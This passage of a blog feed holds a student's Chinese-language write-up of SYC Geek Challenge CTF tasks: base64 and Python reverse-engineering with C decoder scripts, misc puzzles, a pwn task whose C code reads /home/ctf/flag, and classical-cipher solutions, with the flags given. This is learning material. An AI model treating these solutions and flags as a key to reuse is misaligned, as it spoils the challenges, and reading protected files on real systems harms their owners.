*(_BYTE *)(a2 + v7) = aZyxwvutsrqponm[(signed int)*(unsigned __int8 *)(a1 + v8) &gt;&gt; 2];    v5 = v7 + 1;    *(_BYTE *)(a2 + v5++) = aZyxwvutsrqponm[((*(_BYTE *)(a1 + v8 + 1) &amp; 0xF0) &gt;&gt; 4) | 16 * (*(_BYTE *)(a1 + v8) &amp; 3)];    *(_BYTE *)(a2 + v5++) = aZyxwvutsrqponm[((*(_BYTE *)(a1 + v8 + 2) &amp; 0xC0) &gt;&gt; 6) | 4                                                                                    * (*(_BYTE *)(a1 + v8 + 1) &amp; 0xF)];    *(_BYTE *)(a2 + v5) = 61;    v7 = v5 + 1;  &#125;  return (unsigned int)v7;&#125;</code></pre><p>其中最关键的还是那个 zyxwvutsrqponmlkjihgfedcbaABCDEFGHIJKLMNOPQRSTUVWXYZ9876543210-_ ，这是将编码的索引表改了。</p><pre><code>// local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123;  _BYTE *v4; // [rsp+20h] [rbp-30h]  int v5; // [rsp+2Ch] [rbp-24h]  int v6; // [rsp+44h] [rbp-Ch]  int v7; // [rsp+48h] [rbp-8h]  int i; // [rsp+48h] [rbp-8h]  int v9; // [rsp+4Ch] [rbp-4h]  _main(*(_QWORD *)&amp;argc, argv, envp);  v5 = strlen(&quot;Happy birthday! yangtianci!&quot;);  if ( v5 % 3 )    v9 = 4 * (v5 / 3 + 1);  else    v9 = 4 * (v5 / 3);  v4 = malloc(v9 + 1i64);  v4[v9] = 0;  v7 = 0;  v6 = 0;  while ( v7 &lt; v5 )  &#123;    v4[v6] = aAbcdefghijklmn[(char)(aHappyBirthdayY[v7] &gt;&gt; 2)];    v4[v6 + 1] = aAbcdefghijklmn[16 * (aHappyBirthdayY[v7] &amp; 3) | (char)(aHappyBirthdayY[v7 + 1] &gt;&gt; 4)];    v4[v6 + 2] = aAbcdefghijklmn[4 * (aHappyBirthdayY[v7 + 1] &amp; 0xF) | (char)(aHappyBirthdayY[v7 + 2] &gt;&gt; 6)];    v4[v6 + 3] = aAbcdefghijklmn[aHappyBirthdayY[v7 + 2] &amp; 0x3F];    v7 += 3;    v6 += 4;  &#125;  if ( v5 % 3 == 1 )  &#123;    v4[v9 - 2] = 61;    v4[v9 - 1] = 61;  &#125;  else if ( v5 % 3 == 2 )  &#123;    v4[v9 - 1] = 61;  &#125;  for ( i = 0; i &lt; v9; ++i )    putchar((unsigned __int8)v4[i]);  return 0;&#125;</code></pre><p>可以将自己写的base编码放到IDA里面看，与题中对比，大同小异。</p><p>总结：看伪代码需要明确知道定义的各个变量的含义，以及放到子函数总哪个变量对应哪个变量，慢慢分析。</p><h4 id="写脚本"><a href="#写脚本" class="headerlink" title="写脚本"></a>写脚本</h4><p>写脚本需要掌握base64解码</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */int main(int argc, char *argv[]) &#123;        char *str1=&quot;maj7TmztjquUN8Xm-hKplvaYfEAxrUnIc51qxlKOwCKN4XsdzBmjOd_-&quot;;        unsigned char *str2;        int table[]=&#123;0,0,0,0,0,0,0,0,0,0,0,0,             0,0,0,0,0,0,0,0,0,0,0,0,             0,0,0,0,0,0,0,0,0,0,0,             0,0,0,0,0,0,0,0,0,0,62,0,             0,61,60,59,58,57,56,55,             54,53,52,0,0,0,0,0,0,0,26,             27,28,29,30,31,32,33,34,35,36,37,38,             39,40,41,42,43,44,45,46,47,             48,49,50,51,0,0,0,0,63,0,25,             24,23,22,21,20,19,18,17,16,             15,14,13,12,11,10,9,8,7,             6,5,4,3,2,1,0               &#125;; //换了之后的索引表        int len1;        int len2;        int i,j;         len1=strlen(str1);        if(strstr(str1,&quot;==&quot;))        &#123;            len2=(len1/4)*3-2;        &#125;            else if(strstr(str1,&quot;=&quot;))        &#123;            len2=(len1/4)*3-1;        &#125;        else        &#123;            len2=(len1/4)*3;        &#125;        str2=malloc(sizeof(unsigned char)*len2+1);          str2[len2]=&#39;\0&#39;;        for(i=0,j=0;i&lt;len1-2;i+=4,j+=3)        &#123;            str2[j]=((table[str1[i]])&lt;&lt;2)|((table[str1[i+1]])&gt;&gt;4);            str2[j+1]=(table[str1[i+1]]&lt;&lt;4)|((table[str1[i+2]])&gt;&gt;2);            str2[j+2]=((table[str1[i+2]])&lt;&lt;6)|(table[str1[i+3]]);        &#125;    //    printf(&quot;%d&quot;,len2);         for(i=0;i&lt;len2;i++)        &#123;              printf(&quot;%d &quot;,str2[i]);           &#125;           printf(&quot;\n&quot;) ;        //第一步base解码           for(i=0;i&lt;len2;i++)           &#123;               str2[i]=((str2[i]^i)&lt;&lt;4)|((str2[i]^i)&gt;&gt;4); //第二步解密。               printf(&quot;%c&quot;,str2[i]);           &#125;    return 0;&#125;</code></pre><h4 id="三-得到flag"><a href="#三-得到flag" class="headerlink" title="三.得到flag"></a>三.得到flag</h4><p>SYC{M0dified_B@se64_is_Sti11_S1mpl3_Right}</p><h3 id="9-un-snake"><a href="#9-un-snake" class="headerlink" title="9.un_snake"></a>9.un_snake</h3><h4 id="一-反汇编"><a href="#一-反汇编" class="headerlink" title="一.反汇编"></a>一.反汇编</h4><p>首先下载下来发现是pyc的文件，网上一搜需要反编译，用网上在线编译，发现少了很多代码。然后用uncompyle6进行反编译</p><pre><code>uncompyle6 -o  C:\Users\hp\Downloads\un_snake.cpython-38.py C:\Users\hp\Downloads\un_snake.cpython-38.pyc</code></pre><p>在cmd中输入这串代码如果这样有</p><pre><code># Successfully decompiled file</code></pre><p>代表成功了</p><h3 id="二-分析代码-1"><a href="#二-分析代码-1" class="headerlink" title="二.分析代码"></a>二.分析代码</h3><p>将反编译出来的.py文件后缀名改为.c。为了好看一点，打开如下</p><pre><code># uncompyle6 version 3.7.4# Python bytecode 3.8 (3413)# Decompiled from: Python 3.8.5 (tags/v3.8.5:580fbb0, Jul 20 2020, 15:57:54) [MSC v.1924 64 bit (AMD64)]# Embedded file name: ./un_snake.py# Compiled at: 2020-08-05 16:20:40# Size of source mod 2**32: 1238 bytesimport thisfrom base64 import *def pre(data):    th1s = &#39;TBESCFSRSAEUITANAIIN&#39;.encode()    if (data_len := len(data)) &gt; (th1s_len := len(th1s)):        th1s = th1s * (data_len // th1s_len) + th1s[:data_len - th1s_len]     #这个if主要是将date的长度弄的和th1s一样    return bytes(map(lambda x, y: x ^ y, data, th1s))  #再算stuff.encode()def enc(plain):    plain = list(plain)    plain = plain[::-1]  #将字符串反着排序     for i in range(len(plain)):        c = plain[i]        plain[i] = (c &lt;&lt; 3 | c &gt;&gt; 5) &amp; 255   #先执行for循环，再执行else里面的    else:        for i in range(len(plain) - 1):            plain[i] ^= plain[(i + 1)]#异或运算，将plain加密了        else:            return bytes(plain)  #再算stuff_ready def check(a):    return b64encode(a) == b&#39;mEiQCAjJoXJy2NiZQGGQyRm6IgHYQZAICKgowHHo4Dg=&#39;  //base64解码，先算enc(stuff_ready) if __name__ == &#39;__main__&#39;:    print()    while True:        stuff = input(&#39;Now input you flag:&#39;)   //输入的flag，最终目标         stuff_ready = pre(stuff.encode())        result = check(enc(stuff_ready))#其实就是3个逆向的问题，一步一步往上推，每一个函数都代表一个加密，其中第2个加密最复杂        if result:            print(&#39;You get it! Python is so charming right?&#39;)            break        else:            print(&#39;Failed, try again!&#39;)    print(&#39;[馃悕] Commit you flag, see you next time!&#39;)</code></pre><p>看到这个Python代码，开始什么感觉有些地方看不懂，网上查了一部分，Python自学了一部分(也就学到了列表)，然后进行分析个大概思路，简略分析在上面的代码后面,下面是查找的一些内容。</p><p>1.plain = plain[::-1]</p><pre><code>b = a[i:j]   表示复制a[i]到a[j-1]，以生成新的list对象a = [0,1,2,3,4,5,6,7,8,9]b = a[1:3]   # [1,2]当i缺省时，默认为0，即 a[:3]相当于 a[0:3]当j缺省时，默认为len(alist), 即a[1:]相当于a[1:10]当i,j都缺省时，a[:]就相当于完整复制一份ab = a[i:j:s]表示：i,j与上面的一样，但s表示步进，缺省为1.所以a[i:j:1]相当于a[i:j]当s&lt;0时，i缺省时，默认为-1. j缺省时，默认为-len(a)-1所以a[::-1]相当于 a[-1:-len(a)-1:-1]，也就是从最后一个元素到第一个元素复制一遍，即倒序。</code></pre><p>2.map(lambda x, y: x ^ y, data, th1s)</p><p><a href="https://blog.csdn.net/landing_guy_/article/details/109331685" title="map，lambda">https://blog.csdn.net/landing_guy_/article/details/109331685</a></p><p>3.for循环后面直接接else（主要是学Python没见过，不知道怎么走）</p><p><a href="https://blog.csdn.net/wj1066/article/details/81913696">https://blog.csdn.net/wj1066/article/details/81913696</a></p><h4 id="三-写脚本-1"><a href="#三-写脚本-1" class="headerlink" title="三.写脚本"></a>三.写脚本</h4><p>然后开始写脚本，由于本人很菜所以，将base64解码分开写的。</p><p>由于网上直接base64解码，会出现乱码，所以在Python中解码，代码如下</p><pre><code>import base64url = &quot;mEiQCAjJoXJy2NiZQGGQyRm6IgHYQZAICKgowHHo4Dg=&quot;str_url = base64.b64decode(url)print(str_url)</code></pre><p>得到结果</p><pre><code>b&#39;\x98H\x90\x08\x08\xc9\xa1rr\xd8\xd8\x99@a\x90\xc9\x19\xba&quot;\x01\xd8A\x90\x08\x08\xa8(\xc0q\xe8\xe08&#39;</code></pre><p>是16进制和一些字符的组合，全部换为10进制（因为我比较喜欢10进制），注意最后的那个8，它转换为10进制是56，就是这一个数，会让你得不到flag（本人深有体会)。转出来如下</p><pre><code>a[]=&#123;152,72,144,8,8,201,161,114,114,216,216,153,64,97,144,201,25,186,34,1,216,65,144,8,8,168,40,192,113,232,224,56&#125;</code></pre><p>然后进行第二，三步解密</p><pre><code>#include&lt;stdio.h&gt;#include &lt;string.h&gt;int main(void)&#123;int a[]=&#123;152,72,144,8,8,201,161,114,114,216,216,153,64,97,144,201,25,186,34,1,216,65,144,8,8,168,40,192,113,232,224,56&#125;;//base64解码后的10进制。int b[]=&#123;84,66,69,83,67,70,83,82,83,65,69,85,73,84,65,78,65,73,73,78,84,66,69,83,67,70,83,82,83,65,69,85&#125;;//这是上面Python中的th1s换成了10进制，可以另外写一个脚本吧上面th1s用整型输出，就不用一个一个写。因为base64解码后的长度为64，故b[]的长度也必须要是32，也就是原来的基础上加上前12个字符。int i,j;int c,t,len;len=sizeof(a)/sizeof(int);//求出解码后的长度，32printf(&quot;%d&quot;,len);printf(&quot;\n&quot;);for(i=0;i!=len;i++)&#123;    printf(&quot;%d,&quot;,a[i]);&#125;printf(&quot;\n&quot;);printf(&quot;%d&quot;,a[31]);printf(&quot;\n&quot;);for(i=len-2;i!=-1;i--)&#123;    a[i]=a[i]^a[i+1];//反向异或回去，可以自己举4个数来看看是不是真的可以反向异或回去。&#125;for(i=0;i!=len;i++)&#123;    printf(&quot;%d,&quot;,a[i]);&#125;printf(&quot;\n&quot;);for(i=0;i!=len;i++)&#123;    a[i]=((a[i]&lt;&lt;5)|(a[i]&gt;&gt;3))&amp;255;//进行位移运算，也可以举例看看怎么弄回去。注意的是其中的&amp;，作用为：主要是限定范围。不会得到大于255的数。    printf(&quot;%d,&quot;,a[i]);&#125;//输出位移后的数组 printf(&quot;\n&quot;);for(i = 0; i &lt; (len-1)/2; i++)&#123;    t = a[i];    a[i] = a[len-i-1];    a[len-i-1] = t;&#125;//将字符串倒序 for(i=0;i!=len;i++)&#123;    printf(&quot;%d,&quot;,a[i]);&#125;printf(&quot;\n&quot;);for(i=0;i!=len;i++)&#123;    a[i]=a[i]^b[i];    printf(&quot;%c&quot;,a[i]);&#125;//输出最后的flag</code></pre><p>附加脚本</p><p>16进制转10进制<br>    #include &lt;stdio.h&gt;</p><pre><code>int main(void) &#123;    int i;    int a[]=&#123;0x98,0x48,0x90,0x08,0x08,0xc9,0xa1,0x72,0x72,0xd8,0xd8,0x99,0x40,0x61,0x90,0xc9,0x19,0xba,0x22,0x01,0xd8,0x41,0x90,0x08,0x08,0xa8,0x28,0xc0,0x71,0xe8,0xe0,0x38&#125;;    for(i=0;i!=32;i++)    &#123;        printf(&quot;%d,&quot;,a[i]);    &#125;    printf(&quot;\n&quot;);    return 0;&#125;</code></pre><p>th1s转10进制</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    char a[]=&quot;TBESCFSRSAEUITANAIINTBESCFSRSAEU&quot;;    int i;    for(i=0;a[i]!=&#39;\0&#39;;i++)    &#123;        printf(&quot;%d,&quot;,a[i]);    &#125;    return 0;&#125;</code></pre><h4 id="四-得到flag"><a href="#四-得到flag" class="headerlink" title="四.得到flag"></a>四.得到flag</h4><p>SYC{ssssss_Th1sfPs_Pyth0n_ssss~}#我得到的是这个，可能上面某个位置数据错了，看了下flag，直接改一下得到下面的flag。</p><pre><code>SYC&#123;ssssss_Th1s_is_Pyth0n_ssss~&#125;</code></pre><h2 id="Misc题目"><a href="#Misc题目" class="headerlink" title="Misc题目"></a>Misc题目</h2><h3 id="1-一“页”障目"><a href="#1-一“页”障目" class="headerlink" title="1.一“页”障目"></a>1.一“页”障目</h3><p>直接把宣传单对折，得到flag</p><h3 id="2-壮言壮语"><a href="#2-壮言壮语" class="headerlink" title="2.壮言壮语"></a>2.壮言壮语</h3><p>直接网上佛曰解密，得到flag</p><pre><code>我刘壮就是np，给你flag吧,SYC&#123;i_l0ve_Japanese_wife&#125;</code></pre><h3 id="3-秘技·反复横跳"><a href="#3-秘技·反复横跳" class="headerlink" title="3.秘技·反复横跳"></a>3.秘技·反复横跳</h3><p>网上根据提示搜索binwalk。<br><a href="https://www.jianshu.com/p/03f15e6fedf3">https://www.jianshu.com/p/03f15e6fedf3</a><br>一道类似的题，在ubuntu中执行网站中的操作就可以了，最后分解图片会得到一个二维码，但是是左右交换了的，也算点题把，交换回来，微信扫一扫，就可以得到flag了</p><pre><code>SYC&#123;L3ft~Le4t~R1gHt~RiGhT&#125;</code></pre><h3 id="4-飞翔的刘壮"><a href="#4-飞翔的刘壮" class="headerlink" title="4.飞翔的刘壮"></a>4.飞翔的刘壮</h3><p>题目提示： Welcome “into” 11th Geek Challeng.这里的into就应该代表的是10。<br>一个游戏，下载到手机上，在得到10分的时候死了，就可以得到flag</p><pre><code>SYC&#123;fl4ppyb1rd_1s_s0_inter3tin9!&#125;</code></pre><h3 id="5-来拼图"><a href="#5-来拼图" class="headerlink" title="5.来拼图"></a>5.来拼图</h3><p>就是从众多图片中选出有flag信息的拼在一起，拼出来有点不好看</p><pre><code>SYC&#123;d60fca51c7e61259191f0&#125;</code></pre><h3 id="6-吉普赛的歌姬"><a href="#6-吉普赛的歌姬" class="headerlink" title="6.吉普赛的歌姬"></a>6.吉普赛的歌姬</h3><p>不知道这道题考什么，考信息收集能力？去QQ空间看看，然后知道flag在相册里面，然后根据说说前两条，先到贴吧看看，然后搜索DJ南方，然后叫你去网易找伪·Nightcore这个电台，（中间还会遇到两个base64加密的假flag，人心险恶）找一首叫吉普赛歌姬的歌（歌里面什么也没有），但是歌下面有评论说，密码是名字+生日，然后进入相册，得到一张图片，上面有flag</p><pre><code>SYC&#123;Fr1endsh1p_1s_w1tchcr@ft&#125;</code></pre><h2 id="pwn题目"><a href="#pwn题目" class="headerlink" title="pwn题目"></a>pwn题目</h2><h3 id="1-数学咋样？"><a href="#1-数学咋样？" class="headerlink" title="1.数学咋样？"></a>1.数学咋样？</h3><p>用ubuntu打开端口</p><pre><code>luckyboy@luckyboy-virtual-machine:~$ nc 81.69.0.47 1111------------------------------------------Can you help me to solve my math problem?------------------------------------------I have 20 tests![0]  num_1 = 822, num_2 = 701I can&#39;t calculate the expression &#39;num_1 + num_2&#39;.input your answer:</code></pre><p>进行20次计算，最后得到flag</p><h3 id="2-runcode"><a href="#2-runcode" class="headerlink" title="2.runcode"></a>2.runcode</h3><p>考点是读取一个文件并输出，百度搜索一下怎么读取一个文件<br><a href="https://blog.csdn.net/qq_26853817/article/details/79756617">https://blog.csdn.net/qq_26853817/article/details/79756617</a>，根据这个来写脚本。如下</p><pre><code>#include &lt;stdio.h&gt; int main(void)&#123;    char a[200] = &#123;0&#125;;    FILE *fp = fopen(&quot;/home/ctf/flag&quot;, &quot;r&quot;);    fgets(a, 100, fp);    puts(a);    return 0; &#125;</code></pre><p>注意数组长度要足够长，不然读不完。放到网站里面run，run两次，得到flag</p><pre><code>SYC&#123;C0din9_ls_E4sy_T0_You&#125;</code></pre><h2 id="密码学题目"><a href="#密码学题目" class="headerlink" title="密码学题目"></a>密码学题目</h2><h3 id="1-二战情报员刘壮"><a href="#1-二战情报员刘壮" class="headerlink" title="1.二战情报员刘壮"></a>1.二战情报员刘壮</h3><p>摩氏密码，直接网上在线解密，得到L1UZHU4NG_I_Z1Y1，得到flag</p><pre><code>SYC&#123;L1UZHU4NG_I_Z1Y1&#125;</code></pre><h3 id="2-铠甲与萨满"><a href="#2-铠甲与萨满" class="headerlink" title="2.铠甲与萨满"></a>2.铠甲与萨满</h3><p>凯撒密码，直接网上在线解密，先根据前三个字母确定位移为6，也可以一个一个试，解密出来的flag为</p><pre><code>SYC&#123;liuzhuangliuzhuang_bangbangbang&#125;</code></pre><h3 id="3-跳跃的指尖"><a href="#3-跳跃的指尖" class="headerlink" title="3.跳跃的指尖"></a>3.跳跃的指尖</h3><p>跳跃的指尖，需要脑洞大一点，就是键盘啦，每一段字母都会围一个单词，写出所有单词就是flag</p><pre><code>SYC&#123;easyCrypto&#125;</code></pre><h3 id="4-成都养猪二厂"><a href="#4-成都养猪二厂" class="headerlink" title="4.成都养猪二厂"></a>4.成都养猪二厂</h3><p>猪圈密码和栅栏密码，网上在线解密，先把图片中的猪圈密码解出来得到ssyirceehsagiulisolbhy，然后根据那个txt里面的内容确定栅栏密码的位移量为7，网上在线解密，得到flag</p><pre><code>SYC&#123;his_house_is_really_big&#125;</code></pre><h3 id="5-规规矩矩的工作"><a href="#5-规规矩矩的工作" class="headerlink" title="5.规规矩矩的工作"></a>5.规规矩矩的工作</h3><p>看题目和提示，应该是考矩阵和希尔密码，直接在网上解矩阵，<a href="https://matrix.reshish.com/">https://matrix.reshish.com/</a>，得到</p><pre><code>x1 = 10x2 = 4x3 = -2</code></pre><p>A=0,B=1,C=2……然后换为字母，为KEY，用cmd打开decode_machine.exe（要不然直接打开好像会闪退），输入KEY,得到flag</p><pre><code>SYC&#123;linear_algebra_make_ctf_great_again&#125;</code></pre><h3 id="6-Simple-calculation"><a href="#6-Simple-calculation" class="headerlink" title="6.Simple calculation"></a>6.Simple calculation</h3><p>这道题部分靠运气，直接解矩阵，得到</p><pre><code>x1 = 77/2x2 = -48x3 = -21x4 = 65x5 = -63/2</code></pre><p>有分数，x1和x5分数求余的话好像网上找了很多也没有解出来，然后试着将，3 7 1 1 20换为29 7 1 1 -6（实际上试了很多数,加上一点点LOL基础），解出来得到</p><pre><code>x1 = 19x2 = 30x3 = 18x4 = -65x5 = 27</code></pre><p>全部换到0~26范围，得到flag</p><pre><code>SYC&#123;TESNB&#125;</code></pre><h3 id="7-韡髻猊岈"><a href="#7-韡髻猊岈" class="headerlink" title="7.韡髻猊岈"></a>7.韡髻猊岈</h3><p>Vigenere解密，网上自己找资料，了解原理，Vigenere解密第一步要确定密钥长度，第二步要算出密钥是什么，这个要知道原理和对照那个Vigenere表来算密钥。<br>首先根据相同的单词算出密钥长度为6，在根据加密内容中的TGP（解密出来肯定是SYC），算出半个密钥为bin，然后开始在bin前面加aaa变成aaabin，去解密，发现SYC后面的英文为</p><pre><code>vhxre iu nh teats bn viiegere，</code></pre><p>那个iu，肯定是is，通过这个又算出一个密钥的字母caabin，在用这个来解密，得到</p><pre><code>thxre is nh tears bn vigegere</code></pre><p>这个thxre肯定是there，从而算出密钥为catbin，得到flag</p><pre><code>SYC&#123;there_is_no_tears_in_vigenere&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web题&quot;&gt;&lt;a href=&quot;#web题&quot; class=&quot;headerlink&quot; title=&quot;web题&quot;&gt;&lt;/a&gt;web题&lt;/h2&gt;&lt;h3 id=&quot;1-朋友的学妹&quot;&gt;&lt;a href=&quot;#1-朋友的学妹&quot; class=&quot;headerlink&quot; title=&quot;1.朋</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2020/11/29/hello-world/"/>
    <id>http://example.com/2020/11/29/hello-world/</id>
    <published>2020-11-29T08:40:16.343Z</published>
    <updated>2020-11-29T14:39:22.601Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
